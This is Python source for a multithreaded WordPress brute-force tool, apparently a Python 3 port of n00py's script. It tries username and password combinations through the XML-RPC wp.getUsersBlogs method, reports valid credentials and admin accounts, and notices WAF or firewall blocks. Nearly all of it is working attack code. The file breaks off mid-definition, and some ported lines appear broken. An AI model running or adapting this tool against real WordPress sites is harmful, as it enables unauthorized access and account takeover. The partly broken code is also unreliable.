import re
import sys
import time
import socket
import urllib.request as urllib2  # Fix for Python 3
import argparse
import threading
from urllib.parse import urljoin  # Fix for Python 3

__author__ = 'n00py'

# These variables must be shared by all threads dynamically
correct_pairs = {}
total = 0

def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False  # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        return False

has_colours = has_colours(sys.stdout)
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

def printout(text, colour=WHITE):
    if has_colours:
        seq = "\x1b[1;%dm" % (30 + colour) + text + "\x1b[0m"
        sys.stdout.write(seq)
    else:
        sys.stdout.write(text)

def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size // size  # Fix division
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(next(iterator))  # Fix for next() in Python 3
        if remain:
            result[i].append(next(iterator))  # Fix for next() in Python 3
            remain -= 1
    return result

def worker(wordlist, thread_no, url, userlist, verbose, debug, agent):
    global total
    global correct_pairs
    for n in wordlist:
        current_pass = wordlist.index(n)
        for x in userlist:
            current_user = userlist.index(x)
            user = userlist[current_user]
            password = wordlist[current_pass]
            if user not in correct_pairs:
                if user != "":
                    if password != "":
                        PasswordAttempt(user, password, url, thread_no, verbose, debug, agent)
        total += 1

def BuildThreads(list_array, url, debug, userlist, verbose, agent):
    if debug:
        print("Here is the content of the wordlists for each thread")
        for i in range(len(list_array)):
            print("Thread " + str(i))
            printout(str(list_array[i]), YELLOW)
            print("\n-----------------------------------------------------")
    threads = []
    for i in range(len(list_array)):
        t = threading.Thread(target=worker, args=(list_array[i], i, url, userlist, verbose, debug, agent))
        t.daemon = True
        threads.append(t)
        t.start()

def PrintBanner(input, wordlist, url, userlist, passlist):
    banner = """\
       ,-~~-.___.       __        __ ____   _____
      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
        /  \-'~;   ||     |                v.1.0.0
       /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
     =(  _____||________|                 ~n00py~
    """
    print(banner)
    print(f"Username List: {input} ({len(userlist)})")
    print(f"Password List: {wordlist} ({len(passlist)})")
    print(f"URL: {url}")

def TestSite(url):
    protocheck(url)
    print(f"Trying: {url}")
    try:
        urllib2.urlopen(url, timeout=3)
    except urllib2.HTTPError as e:
        if e.code == 405:
            print(f"{url} found!")
            print("Now the brute force will begin!  >:)")
        if e.code == 404:
            printout(str(e), YELLOW)
            print(" - XMLRPC has been moved, removed, or blocked")
            sys.exit()
    except urllib2.URLError as g:
        printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
        sys.exit()
    except socket.timeout as e:
        print(type(e))
        printout("The socket timed out, try it again.", YELLOW)
        sys.exit()

def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
    global passlist
    if verbose or debug:
        if debug:
            thready = f"[Thread {thread_no}]"
            printout(thready, YELLOW)
        print(f"Trying {user} : {password}\n")
    
    headers = {'User-Agent': agent,
               'Connection': 'keep-alive',
               'Accept': 'text/html'}
    post = f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"
    
    try:
        req = urllib2.Request(url, post.encode(), headers)  # Encode the POST data
        response = urllib2.urlopen(req, timeout=3)
        the_page = response.read()
        look_for = "isAdmin"
        try:
            splitter = the_page.split(look_for, 1)[1]
            correct_pairs[user] = password
            print("--------------------------")
            success = f"[{user} : {password}] are valid credentials!  "
            adminAlert = ""
            if splitter[23] == "1":
                adminAlert = "- THIS ACCOUNT IS ADMIN"
            printout(success, GREEN)
            printout(adminAlert, RED)
            print("\n--------------------------")
        except:
            pass
    except urllib2.URLError as e:
        if e.code == 404 or e.code == 403:
            global total
            printout(str(e), YELLOW)
            print(" - WAF or security plugin likely in use")
            total = len(passlist)
            sys.exit()
        else:
            printout(str(e), YELLOW)
            print(" - Try reducing Thread count")
            if args.verbose or args.debug:
                print(f"{user}:{password} was skipped")
    except socket.timeout as e:
        printout(str(e), YELLOW)
        print(" - Try reducing Thread count")
        if args.verbose or args.debug:
            print(f"{user}:{password} was skipped")
    except socket.error as e:
        printout(str(e), YELLOW)
        print(" - Got an RST, Probably tripped the firewall\n")
        total = len(passlist)
        sys.exit()

def protocheck
        
